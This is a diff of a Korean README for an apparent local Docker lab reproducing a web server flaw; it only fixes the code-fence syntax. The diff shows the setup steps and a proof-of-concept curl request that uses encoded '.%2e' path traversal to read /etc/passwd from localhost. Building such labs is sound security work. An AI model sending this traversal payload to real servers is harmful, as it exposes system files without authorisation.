@@ -44,21 +44,21 @@
 
 3. 컨테이너 빌드 및 실행  
 
-   '''bash
+   ```bash
    docker-compose up -d --build
-   '''
+   ```
    
 4. 정상 동작 확인  
    
-   '''bash
+   ```bash
    curl -i http://localhost:8080/cgi-bin/hello.sh
-   '''
+   ```
    
 5. 취약점 Poc 호출  
    
-   '''bash
+   ```bash
    curl -i "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-   '''
+   ```
    
 ---
 
